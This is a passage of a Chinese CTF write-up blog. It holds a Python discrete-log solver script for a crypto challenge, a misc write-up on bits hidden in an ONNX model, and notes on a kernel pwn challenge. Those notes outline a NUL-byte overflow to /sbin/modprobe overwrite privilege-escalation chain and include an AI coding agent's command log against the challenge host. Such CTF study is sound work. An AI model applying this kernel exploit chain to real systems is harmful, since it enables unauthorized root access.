class="keyword">def</span> <span class="title function_">sqrt_fp</span>(<span class="params">a: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="comment"># p == 3 mod 4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a % p, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Elt</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Element a+b*w of F_p[w]/(w^2-disc), used only when disc is nonsquare.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    __slots__ = (<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    disc = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a=<span class="number">0</span>, b=<span class="number">0</span></span>):</span><br><span class="line">        self.a = a % p</span><br><span class="line">        self.b = b % p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, other</span>):</span><br><span class="line">        other = to_elt(other)</span><br><span class="line">        <span class="keyword">return</span> Elt(self.a + other.a, self.b + other.b)</span><br><span class="line"></span><br><span class="line">    __radd__ = __add__</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__neg__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> Elt(-self.a, -self.b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__sub__</span>(<span class="params">self, other</span>):</span><br><span class="line">        other = to_elt(other)</span><br><span class="line">        <span class="keyword">return</span> Elt(self.a - other.a, self.b - other.b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rsub__</span>(<span class="params">self, other</span>):</span><br><span class="line">        other = to_elt(other)</span><br><span class="line">        <span class="keyword">return</span> Elt(other.a - self.a, other.b - self.b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line">        other = to_elt(other)</span><br><span class="line">        <span class="keyword">return</span> Elt(self.a * other.a + self.b * other.b * Elt.disc,</span><br><span class="line">                   self.a * other.b + self.b * other.a)</span><br><span class="line"></span><br><span class="line">    __rmul__ = __mul__</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">self</span>):</span><br><span class="line">        den = (self.a * self.a - self.b * self.b * Elt.disc) % p</span><br><span class="line">        <span class="keyword">return</span> Elt(self.a * inv(den), -self.b * inv(den))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__truediv__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self * to_elt(other).inv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rtruediv__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> to_elt(other) * self.inv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, n</span>):</span><br><span class="line">        R = Elt(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">        Q = self</span><br><span class="line">        <span class="keyword">while</span> n:</span><br><span class="line">            <span class="keyword">if</span> n &amp; <span class="number">1</span>:</span><br><span class="line">                R = R * Q</span><br><span class="line">            Q = Q * Q</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_base</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.b % p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.b % p != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;not in base field: <span class="subst">&#123;self.a&#125;</span>+<span class="subst">&#123;self.b&#125;</span>*w&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.a % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_elt</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, Elt):</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">return</span> Elt(x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ec_add_ext</span>(<span class="params">P, Q</span>):</span><br><span class="line">    <span class="keyword">if</span> P <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line">    <span class="keyword">if</span> Q <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> P</span><br><span class="line">    x1, y1 = P</span><br><span class="line">    x2, y2 = Q</span><br><span class="line">    <span class="keyword">if</span> (x1 - x2).a == <span class="number">0</span> <span class="keyword">and</span> (x1 - x2).b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (y1 + y2).a == <span class="number">0</span> <span class="keyword">and</span> (y1 + y2).b == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        lam = (<span class="number">3</span> * x1 * x1 + <span class="number">2</span> * E_A2 * x1 + E_A4) / (<span class="number">2</span> * y1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lam = (y2 - y1) / (x2 - x1)</span><br><span class="line">    x3 = lam * lam - E_A2 - x1 - x2</span><br><span class="line">    y3 = lam * (x1 - x3) - y1</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">map_curve_point_fp</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>):</span><br><span class="line">    den = (x - beta) % p</span><br><span class="line">    t = ((x - alpha) * inv(den)) % p</span><br><span class="line">    Y = (y * delta3 * inv(<span class="built_in">pow</span>(den, <span class="number">3</span>, p))) % p</span><br><span class="line">    <span class="keyword">return</span> ((A * t * t) % p, (A * Y) % p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">map_divisor_to_E1</span>(<span class="params">Qu, Qv</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Map Mumford divisor [u,v] with u=x^2+u1*x+u0 to E1(F_p).&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(Qu) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(Qu) == <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># Rare reduced degree-1 divisor, u=x+u0.</span></span><br><span class="line">        x = (-Qu[<span class="number">0</span>]) % p</span><br><span class="line">        y = Qv[<span class="number">0</span>] % p</span><br><span class="line">        <span class="keyword">return</span> map_curve_point_fp(x, y)</span><br><span class="line"></span><br><span class="line">    u0, u1 = Qu[<span class="number">0</span>] % p, Qu[<span class="number">1</span>] % p</span><br><span class="line">    v0 = Qv[<span class="number">0</span>] % p</span><br><span class="line">    v1 = Qv[<span class="number">1</span>] % p <span class="keyword">if</span> <span class="built_in">len</span>(Qv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    disc = (u1 * u1 - <span class="number">4</span> * u0) % p</span><br><span class="line">    inv2 = (p + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    ls = legendre(disc)</span><br><span class="line">    <span class="keyword">if</span> ls &gt;= <span class="number">0</span>:</span><br><span class="line">        r = <span class="number">0</span> <span class="keyword">if</span> disc == <span class="number">0</span> <span class="keyword">else</span> sqrt_fp(disc)</span><br><span class="line">        xs = [((-u1 + r) * inv2) % p, ((-u1 - r) * inv2) % p]</span><br><span class="line">        R = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xs:</span><br><span class="line">            y = (v0 + v1 * x) % p</span><br><span class="line">            R = ec_add(R, map_curve_point_fp(x, y))</span><br><span class="line">        <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Irreducible u: do the same computation over F_p[w]/(w^2-disc), then</span></span><br><span class="line">    <span class="comment"># take the F_p-rational Galois-invariant sum.</span></span><br><span class="line">    Elt.disc = disc</span><br><span class="line">    w = Elt(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    x1 = (Elt(-u1, <span class="number">0</span>) + w) * inv2</span><br><span class="line">    x2 = (Elt(-u1, <span class="number">0</span>) - w) * inv2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">map_ext</span>(<span class="params">x</span>):</span><br><span class="line">        y = Elt(v0, <span class="number">0</span>) + Elt(v1, <span class="number">0</span>) * x</span><br><span class="line">        den = x - beta</span><br><span class="line">        t = (x - alpha) / den</span><br><span class="line">        Y = y * delta3 / (den ** <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> (A * t * t, A * Y)</span><br><span class="line"></span><br><span class="line">    R = ec_add_ext(map_ext(x1), map_ext(x2))</span><br><span class="line">    <span class="keyword">if</span> R <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (R[<span class="number">0</span>].base(), R[<span class="number">1</span>].base())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">precompute_tables</span>():</span><br><span class="line">    tables = []</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> N1_FACTORS:</span><br><span class="line">        G = ec_mul(N1 // q, P1)</span><br><span class="line">        m = math.isqrt(q) + <span class="number">1</span></span><br><span class="line">        table = &#123;&#125;</span><br><span class="line">        R = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            table.setdefault(R, j)</span><br><span class="line">            R = ec_add(R, G)</span><br><span class="line">        giant = ec_neg(ec_mul(m, G))</span><br><span class="line">        tables.append((q, m, G, giant, table))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] table q=<span class="subst">&#123;q&#125;</span> m=<span class="subst">&#123;m&#125;</span>&quot;</span>, file=sys.stderr, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs_prime</span>(<span class="params">H, item</span>):</span><br><span class="line">    q, m, G, giant, table = item</span><br><span class="line">    R = H</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        j = table.get(R)</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            x = i * m + j</span><br><span class="line">            <span class="keyword">if</span> x &lt; q:</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line">        R = ec_add(R, giant)</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;dlog failed for q=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crt_pair</span>(<span class="params">a1, n1, a2, n2</span>):</span><br><span class="line">    t = ((a2 - a1) * <span class="built_in">pow</span>(n1, -<span class="number">1</span>, n2)) % n2</span><br><span class="line">    <span class="keyword">return</span> (a1 + n1 * t) % (n1 * n2), n1 * n2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_k_mod</span>(<span class="params">Q1, tables</span>):</span><br><span class="line">    rem = <span class="number">0</span></span><br><span class="line">    mod = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> tables:</span><br><span class="line">        q = item[<span class="number">0</span>]</span><br><span class="line">        H = ec_mul(N1 // q, Q1)</span><br><span class="line">        r = bsgs_prime(H, item)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] k mod <span class="subst">&#123;q&#125;</span> = <span class="subst">&#123;r&#125;</span>&quot;</span>, file=sys.stderr, flush=<span class="literal">True</span>)</span><br><span class="line">        rem, mod = crt_pair(rem, mod, r, q)</span><br><span class="line">    <span class="keyword">assert</span> mod == N1</span><br><span class="line">    <span class="keyword">if</span> ec_mul(rem, P1) != Q1:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;CRT result does not verify on E1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> rem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_instance</span>(<span class="params">text: <span class="built_in">str</span></span>):</span><br><span class="line">    qu = ast.literal_eval(re.search(<span class="string">r&quot;Q_u = (\[[^\n]+\])&quot;</span>, text).group(<span class="number">1</span>))</span><br><span class="line">    qv = ast.literal_eval(re.search(<span class="string">r&quot;Q_v = (\[[^\n]+\])&quot;</span>, text).group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> qu, qv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_until_prompt</span>(<span class="params">sock</span>):</span><br><span class="line">    data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    sock.settimeout(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&quot;k =&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        chunk = sock.recv(<span class="number">8192</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data += chunk</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> HOST, PORTS</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">2</span>:</span><br><span class="line">        PORTS = [<span class="built_in">int</span>(sys.argv[<span class="number">1</span>])]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">        HOST = sys.argv[<span class="number">2</span>]</span><br><span class="line">    tables = precompute_tables()</span><br><span class="line">    s = <span class="literal">None</span></span><br><span class="line">    text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> PORTS:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] connecting <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;port&#125;</span> attempt <span class="subst">&#123;attempt&#125;</span>&quot;</span>, file=sys.stderr, flush=<span class="literal">True</span>)</span><br><span class="line">            s = socket.create_connection((HOST, port), timeout=<span class="number">10</span>)</span><br><span class="line">            text = recv_until_prompt(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Q_u =&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s.close()</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Q_u =&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Q_u =&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">        <span class="keyword">raise</span> SystemExit(<span class="string">&quot;did not receive a challenge instance&quot;</span>)</span><br><span class="line">    sys.stderr.write(text + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    Qu, Qv = parse_instance(text)</span><br><span class="line">    Q1 = map_divisor_to_E1(Qu, Qv)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] phi1(Q)=<span class="subst">&#123;Q1&#125;</span>&quot;</span>, file=sys.stderr, flush=<span class="literal">True</span>)</span><br><span class="line">    k = solve_k_mod(Q1, tables)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] k=<span class="subst">&#123;k&#125;</span>&quot;</span>, file=sys.stderr, flush=<span class="literal">True</span>)</span><br><span class="line">    s.sendall((<span class="built_in">str</span>(k) + <span class="string">&quot;\n&quot;</span>).encode())</span><br><span class="line">    out = <span class="string">b&quot;&quot;</span></span><br><span class="line">    s.settimeout(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            out += chunk</span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    sys.stdout.buffer.write(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>或许我该考虑升级一下sage版本或者在sage上装一些远程交互的库…</p>
+<h2 id="Ouroboros-misc"><a href="#Ouroboros-misc" class="headerlink" title="Ouroboros - misc"></a>Ouroboros - misc</h2><p>逆天题目,刚开始就开了一个codex在分析这个,一直到非常后面才做出来,期间酷酷过一车人就Fluu不会,彻底红温了.<br>那么首先各大AI都说,输入是一个20的 <code>vector&lt;float&gt;</code> ,输出是一个21的 <code>vector&lt;float&gt;</code> .根据提示衔尾蛇,我考虑全0然后跑自环,全1,递增,偏移k,甚至把里面的add0和mul1的后面的hex也拿出来拼一起凑flag,或者构造输入跑自环,每一轮输出一个flag的字符,全部失败了.</p>
+<p>最后发现是什么呢?gather和slice两种操作在这个程序中是可逆的,所以以这个藏01,拿到了flag的前半段:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;SpiritGame&#123;wtf_h0w_c\x07\xf1&#x27;</span><br></pre></td></tr></table></figure>
+<p>然后再把这个半段塞进去,吐出来后半段.<br>这个题真逆天.</p>
+<p>不过回头想想也确实,misc如果让你猜输入,这个值域是无限的而且试典型值没什么结果的话就赶紧撤退,考虑模型本身隐藏了哪些信息或比特,或者直接统计某种操作有多少个.</p>
+<p>这个题我问了ds,gemini thinking,gpt,claude opus 4.7,还有本地的codex,试了半天才试出来.<br>脑电波,神奇吧?</p>
+<p>附上一些对话…gemini其实挺接近了.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ouroboros</span><br><span class="line">onnx模型和衔尾蛇有什么关系？</span><br><span class="line">这个题是ctf misc题目,提示是Ouroboros,尝试还原flag</span><br></pre></td></tr></table></figure>
+<p>这是一个非常有趣且硬核的 CTF Misc 题目！</p>
+<h3 id="ONNX-模型与“衔尾蛇-Ouroboros-”的关系"><a href="#ONNX-模型与“衔尾蛇-Ouroboros-”的关系" class="headerlink" title="ONNX 模型与“衔尾蛇 (Ouroboros)”的关系"></a>ONNX 模型与“衔尾蛇 (Ouroboros)”的关系</h3><p>在计算机科学和机器学习的语境下，<strong>ONNX（Open Neural Network Exchange）</strong> 是用于表示深度学习模型的标准格式。从数据结构上讲，标准的 ONNX 模型必须是一个 <strong>DAG（有向无环图，Directed Acyclic Graph）</strong>，这意味着它的数据流是单向的，<strong>绝对不允许存在真正的物理环路</strong>。</p>
+<p>然而，<strong>“衔尾蛇 (Ouroboros)”</strong> 的核心隐喻是“吞噬自己尾巴的蛇”，象征着<strong>无限循环、自我递归或首尾相连</strong>。</p>
+<p>这两者结合在一起，指向了这道题的核心考点——<strong>这是一个 ONNX Quine（自产生程序）或者在元数据层面首尾相连的“伪环”模型</strong>。</p>
+<ol>
+<li><strong>结构上的首尾相连</strong>：仔细看你提供的文本末尾，在执行完所有计算到达 <code>dead_add_2519_ee66eb</code> 后，它通过一个自定义属性 <code>onnx_bit_chain</code> 直接将尾部强行关联回了最初的输入节点 <code>answer_weight_0001_8f79b3</code>。它在 DAG 的限制下，用元数据画出了一个逻辑上的圆（衔尾蛇）。</li>
+<li><strong>零输入与自生成</strong>：模型图内部充斥着大量的常量节点（如 <code>add_zero</code>、<code>mul_one</code>），这意味着它不需要外界提供任何输入（Input），仅凭内部的张量进行算术逻辑推演，最终输出自身的网络结构代码或隐蔽的 Flag（即输出 <code>answer_codes</code>）。</li>
+</ol>
+<hr>
+<h3 id="尝试还原-Flag-的思路"><a href="#尝试还原-Flag-的思路" class="headerlink" title="尝试还原 Flag 的思路"></a>尝试还原 Flag 的思路</h3><p>从你提供的 <code>strings</code> 层面的文本，我们可以看出这道题有两种解法（静态分析提取与动态执行还原）：</p>
+<h4 id="方法一：静态分析提取比特链（Bit-chain）"><a href="#方法一：静态分析提取比特链（Bit-chain）" class="headerlink" title="方法一：静态分析提取比特链（Bit-chain）"></a>方法一：静态分析提取比特链（Bit-chain）</h4><p>文本中存在大量的数学上的<strong>无用操作（NOP）</strong>：</p>
+<ul>
+<li><code>add_zero</code> (加 0，值不变)</li>
+<li><code>mul_one</code> (乘 1，值不变)</li>
+</ul>
+<p>出题人故意使用这些冗余操作，实际上是为了在计算图中嵌入一个<strong>二进制流</strong>：</p>
+<ul>
+<li>所有的 <code>add_zero</code> 节点代表二进制的 <strong><code>0</code></strong></li>
+<li>所有的 <code>mul_one</code> 节点代表二进制的 <strong><code>1</code></strong></li>
+</ul>
+<p>你可以按节点的索引顺序（如 <code>0010</code>、<code>0013</code>、<code>0031</code>…）将这些特征提取出来。例如最开始的几个特征：<br><code>add_zero_0010</code> (0), <code>mul_one_0013</code> (1), <code>mul_one_0031</code> (1), <code>mul_one_0034</code> (1), <code>mul_one_0072</code> (1), <code>add_zero_0109</code> (0), <code>mul_one_0133</code> (1), <code>mul_one_0146</code> (1)<br>这前 8 个操作组成的二进制是 <code>01111011</code>，其对应的十进制是 <code>123</code>，正好对应 ASCII 字符中的 <strong><code>&#123;</code></strong> ！（Flag 格式的标志性字符）。<br>如果将所有这些节点以及末尾处于“dead”状态的 <code>dead_zero</code> 收集全并按每 8 位转换为 ASCII，大概率能直接静态解出被切碎的 Flag。</p>
+<h4 id="方法二：动态执行模型（推荐，最快捷）"><a href="#方法二：动态执行模型（推荐，最快捷）" class="headerlink" title="方法二：动态执行模型（推荐，最快捷）"></a>方法二：动态执行模型（推荐，最快捷）</h4><p>既然这是一个自驱动的模型，它最终会把所有的二进制链进行拼接、重塑、切片处理，并输出给最终的 <code>answer_codes</code>。<br>由于所有参数内置，你只需要配置好 Python 环境并直接运行推理，让模型自己把 Flag 吐出来。你可以写一段极其简单的 Python 脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> onnxruntime <span class="keyword">as</span> ort</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载你的 onnx 模型</span></span><br><span class="line">sess = ort.InferenceSession(<span class="string">&quot;challenge.onnx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个模型不需要任何外部特征输入，直接让它自我推演（衔尾蛇吞尾）</span></span><br><span class="line">outputs = sess.run(<span class="literal">None</span>, &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 它的输出 answer_codes 就是处理好的结果</span></span><br><span class="line">answer_codes = outputs[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将张量转换回 uint8 并解码为字符串打印</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = <span class="built_in">bytes</span>(answer_codes.astype(np.uint8)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解出的 Flag:&quot;</span>, flag)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原始张量输出:&quot;</span>, answer_codes)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>总结</strong>：出题人非常巧妙地将 Flag 二进制化，用 ONNX 里的“乘 1”和“加 0”构筑了一条信息链（<code>onnx-bit-chain</code>），并通过尾部节点挂载头节点的元数据完成了“衔尾蛇”的闭环。跑一下上面的脚本，或者按位转 ASCII 就能拿到最终的 Flag！</p>
+<h2 id="NULL-pwn"><a href="#NULL-pwn" class="headerlink" title="NULL - pwn"></a>NULL - pwn</h2><p>从这个题开始,Fluu彻底疯狂了,因为进不了前十就血亏,所以用Cursor无脑上了,下面的flag都是Cursor出的.</p>
+<p>首先用codex分析了半天:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[null](null/) 这是一个ctf pwn题目,尝试找到程序的bug并还原flag.</span><br><span class="line">注意:我正等待靶机,你先分析,写好脚本.</span><br></pre></td></tr></table></figure>
+<p>结论：<code>/dev/vuln</code> 有 <strong>0x400 处的 1-byte NUL 越界写</strong>。</p>
+<p>链路：<code>pipe</code> page overlap → 改 <code>struct file-&gt;f_mode</code> → 覆写 <code>/sbin/modprobe</code> → 触发拿 flag。</p>
+<p>脚本已备好：<code>null/solve_remote.py</code>（配套 <code>null/exploit_modprobe.c</code> / <code>null/helper_modprobe.c</code>）。<br>等你给靶机 <code>host:port</code>，直接跑：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python null/solve_remote.py --host &lt;IP&gt; --port &lt;PORT&gt;</span><br></pre></td></tr></table></figure>
+<p>然后后半段拿到靶机之后codex开始发疯了:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc challenge.jlu-terminal.site 41078</span><br><span class="line">这是靶机地址,相关程序: nc位于&quot;D:\SucksFluorine\CTF\MISC\nc\nc.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>我先接着现有利用链排查脚本和远程稳定性。<br>已运行 Get-ChildItem -Force<br>我先看现有 null 目录里的利用脚本和源码，定位卡在远程哪一步。<br>已运行 4 条命令<br>我补看利用程序后半段和启动脚本，确认远程触发顺序。<br>已运行 4 条命令<br>我先确认远程脚本是否本身有逻辑 bug，避免“脚本没等到 exploit 跑完”误判成利用失败。<br>已运行 3 条命令<br>我顺手看下 rootfs 里的 rootsh，它可能暴露出题目的预期提权/触发方式。<br>已运行 3 条命令<br>我确认一下两个二进制是否真的按预期编译成了静态/可执行形式。<br>已运行 3 条命令<br>我先把现有远程尝试记录搜出来，看 exploit 停在“触发 modprobe”还是“读 flag”阶段。<br>已运行 Get-ChildItem -Recurse -File | Select-String -Pattern ‘victim_pipe=|origin_pipe=|/sbin/modprobe overwritten|Bad page state|failed to read flag|triggering modprobe|reading flag|pfn:’ | Select-Object Path,LineNumber,Line | Format-Table -Wrap -AutoSize<br>我直接连远程跑一轮当前 exploit，采集真实输出。<br>已运行 python .\null\solve_remote.py —host challenge.jlu-terminal.site —port 41078 —retries 1<br>我先裸连靶机，看服务实际交互长什么样，排除脚本和题目包装不匹配。<br>已运行 python -c “import socket,time; s=socket.create_connection((‘challenge.jlu-terminal.site’,41078),10); s.settimeout(2); data=b’’ try: while True: try: c=s.recv(4096) if not c: break data+=c if len(c)&lt;4096: time.sleep(0.2) except Exception: break finally: print(data.decode(‘utf-8’,’replace’)) s.close()”<br>我换 nc/原始 socket 做最小探测，看看是不是有包装层、超时或需要先发数据。</p>
+<p>…………中间真的很长,一直在调用工具改写法,不知道明明有了wp还在改什么</p>
